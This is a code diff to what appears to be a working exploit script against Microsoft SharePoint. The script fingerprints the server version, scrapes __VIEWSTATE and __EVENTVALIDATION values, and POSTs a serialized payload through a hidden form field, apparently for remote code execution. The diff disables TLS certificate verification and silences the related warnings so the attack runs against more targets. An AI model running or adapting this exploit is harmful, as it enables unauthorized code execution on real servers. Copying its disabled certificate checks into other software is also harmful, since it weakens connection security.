@@ -9,6 +9,8 @@ import codecs
 import readline
 from clint.arguments import Args
 import signal
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def serialize_command(cmd):
     total = ""
@@ -94,7 +96,7 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
 }
 
-firstcall = requests.get(url,headers=headers)
+firstcall = requests.get(url,headers=headers,verify=False)
 spheader = firstcall.headers.get('MicrosoftSharePointTeamServices','16')
 
 spheader = int(spheader.split('.')[0])
@@ -112,7 +114,7 @@ else:
 
 FullURL = url +  assemblyvalue
 
-secondcall = requests.get(FullURL,headers=headers)
+secondcall = requests.get(FullURL,headers=headers,verify=False)
 secondcalltext = secondcall.text
 
 tree = html.fromstring(secondcall.content)
@@ -159,6 +161,6 @@ payload = payload.replace("zzzz",serialized_length)
 print("Deserialized Payload:")
 print(deserialize_command(payload[8:]))
 data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":eventvalidation,"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData":payload}
-thirdcall = requests.post(FullURL, data=data,headers=headers)
+thirdcall = requests.post(FullURL, data=data,headers=headers,verify=False)
 
 print("Payload launched! Check execution results. Exiting...")
